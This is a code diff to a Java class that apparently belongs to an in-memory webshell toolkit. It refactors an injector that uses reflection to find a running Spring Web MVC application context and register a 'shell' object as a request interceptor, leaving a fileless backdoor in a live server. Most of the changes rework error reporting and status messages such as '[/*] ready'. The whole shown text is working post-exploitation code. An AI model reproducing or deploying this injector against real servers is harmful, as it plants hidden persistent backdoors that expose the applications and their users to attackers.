@@ -3,8 +3,8 @@ package com.reajason.javaweb.memshell.injector.springwebmvc;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Field;
-import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.List;
 import java.util.Set;
@@ -16,6 +16,8 @@ import java.util.zip.GZIPInputStream;
  */
 public class SpringWebMvcInterceptorInjector {
 
+    private String msg = "";
+
     public String getClassName() {
         return "{{className}}";
     }
@@ -25,38 +27,38 @@ public class SpringWebMvcInterceptorInjector {
     }
 
     public SpringWebMvcInterceptorInjector() {
+        Object context = null;
         try {
-            Object context = getContext();
-            Object interceptor = getShell();
-            inject(context, interceptor);
-        } catch (Exception e) {
-            e.printStackTrace();
+            context = getContext();
+        } catch (Throwable e) {
+            msg += "context error: " + getErrorMessage(e);
         }
+        try {
+            Object shell = getShell();
+            msg += "context: [" + context + "] ";
+            inject(context, shell);
+            msg += "[/*] ready\n";
+        } catch (Throwable e) {
+            msg += "failed " + getErrorMessage(e) + "\n";
+        }
+        System.out.println(msg);
     }
 
-    @SuppressWarnings("all")
-    public Object getContext() throws ClassNotFoundException, InvocationTargetException, NoSuchMethodException, IllegalAccessException {
+    @SuppressWarnings("unchecked")
+    public Object getContext() throws Exception {
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        Object context = null;
         try {
             Object requestAttributes = invokeMethod(classLoader.loadClass("org.springframework.web.context.request.RequestContextHolder"), "getRequestAttributes");
             Object request = invokeMethod(requestAttributes, "getRequest");
-            context = invokeMethod(request, "getAttribute", new Class[]{String.class}, new Object[]{"org.springframework.web.servlet.DispatcherServlet.CONTEXT"});
+            return invokeMethod(request, "getAttribute", new Class[]{String.class}, new Object[]{"org.springframework.web.servlet.DispatcherServlet.CONTEXT"});
         } catch (Exception e) {
-            e.printStackTrace();
-        }
-        if (context == null) {
-            try {
-                Set<Object> applicationContexts = (Set<Object>) getFieldValue(classLoader.loadClass("org.springframework.context.support.LiveBeansView").newInstance(), "applicationContexts");
-                Object applicationContext = applicationContexts.iterator().next();
-                if (classLoader.loadClass("org.springframework.web.context.WebApplicationContext").isAssignableFrom(applicationContext.getClass())) {
-                    context = applicationContext;
-                }
-            } catch (Exception e) {
-                e.printStackTrace();
+            Set<Object> applicationContexts = (Set<Object>) getFieldValue(classLoader.loadClass("org.springframework.context.support.LiveBeansView").newInstance(), "applicationContexts");
+            Object applicationContext = applicationContexts.iterator().next();
+            if (classLoader.loadClass("org.springframework.web.context.WebApplicationContext").isAssignableFrom(applicationContext.getClass())) {
+                return applicationContext;
             }
         }
-        return context;
+        return null;
     }
 
     @SuppressWarnings("all")
@@ -81,12 +83,15 @@ public class SpringWebMvcInterceptorInjector {
         List<Object> adaptedInterceptors = (List<Object>) getFieldValue(abstractHandlerMapping, "adaptedInterceptors");
         for (Object adaptedInterceptor : adaptedInterceptors) {
             if (adaptedInterceptor.getClass().getName().equals(getClassName())) {
-                System.out.println("interceptor already injected");
                 return;
             }
         }
         adaptedInterceptors.add(interceptor);
-        System.out.println("interceptor injected successfully");
+    }
+
+    @Override
+    public String toString() {
+        return msg;
     }
 
     @SuppressWarnings("all")
@@ -166,7 +171,7 @@ public class SpringWebMvcInterceptorInjector {
 
             }
         }
-        throw new NoSuchFieldException(name);
+        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
     }
 
 
@@ -179,5 +184,20 @@ public class SpringWebMvcInterceptorInjector {
         } catch (NoSuchFieldException ignored) {
         }
         return null;
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
     }
 }
